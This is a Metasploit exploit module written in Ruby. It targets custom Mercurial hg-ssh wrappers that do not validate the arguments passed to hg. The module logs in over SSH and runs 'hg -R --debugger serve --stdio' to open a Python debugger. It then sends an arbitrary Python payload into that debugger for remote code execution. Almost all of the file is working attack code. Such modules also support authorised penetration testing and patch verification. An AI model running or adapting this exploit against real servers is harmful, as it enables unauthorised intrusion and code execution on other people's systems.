# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SSH

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Mercurial Custom hg-ssh Wrapper Remote Code Exec",
      &#039;Description&#039;    => %q{
        This module takes advantage of custom hg-ssh wrapper implementations that don&#039;t
        adequately validate parameters passed to the hg binary, allowing users to trigger a
        Python Debugger session, which allows arbitrary Python code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;claudijd&#039;,
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;,   &#039;https://www.mercurial-scm.org/wiki/WhatsNew#Mercurial_4.1.3_.282017-4-18.29&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Apr 18 2017",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username for authentication&#039;, &#039;root&#039; ]),
        OptPath.new(&#039;SSH_PRIV_KEY_FILE&#039;, [ true, &#039;The path to private key for ssh auth&#039;, &#039;&#039; ]),
      ]
    )

    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )
  end

  def rhost
    datastore[&#039;RHOST&#039;]
  end

  def rport
    datastore[&#039;RPORT&#039;]
  end

  def username
    datastore[&#039;USERNAME&#039;]
  end

  def ssh_priv_key
    File.read(datastore[&#039;SSH_PRIV_KEY_FILE&#039;])
  end

  def exploit
    factory = ssh_socket_factory
    ssh_options = {
      auth_methods: [&#039;publickey&#039;],
      config: false,
      use_agent: false,
      key_data: [ ssh_priv_key ],
      port: rport,
      proxy: factory,
      non_interactive:  true
    }

    ssh_options.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]

    print_status("#{rhost}:#{rport} - Attempting to login...")

    begin
      ssh = nil
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        ssh = Net::SSH.start(rhost, username, ssh_options)
      end
    rescue Rex::ConnectionError
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication due wrong credentials."
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end

    if ssh
      print_good("SSH connection is established.")
      ssh.open_channel do |ch|
        ch.exec "hg -R --debugger serve --stdio" do |ch, success|
          ch.on_extended_data do |ch, type, data|
            if data.match(/entering debugger/)
              print_good("Triggered Debugger (#{data})")
              ch.send_data "#{payload.encoded}\n"
            else
              print_bad("Unable to trigger debugger (#{data})")
            end
          end
        end
      end

      begin
        ssh.loop unless session_created?
      rescue Errno::EBADF => e
        elog(e.message)
      end
    end
  end
end

